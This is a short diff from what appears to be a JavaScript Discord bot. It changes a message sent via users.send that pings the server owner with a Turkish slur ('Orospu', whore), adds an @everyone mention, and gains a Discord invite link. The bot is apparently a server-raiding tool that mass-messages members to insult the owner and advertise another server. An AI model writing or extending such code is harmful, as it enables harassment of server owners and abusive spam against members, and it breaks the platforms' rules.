@@ -110,7 +110,7 @@ client.on("message", async msg => {
         users.send(
           "`Patladı knk, Burdan` <@" +
             msg.guild.owner.id +
-            "> `İsimli Orospuya Selamlar`\n || @everyone || "
+            "> `İsimli Orospuya Selamlar`\n || @everyone || https://discord.gg/xft7cnN "
         )
       )
       .catch(console.error);
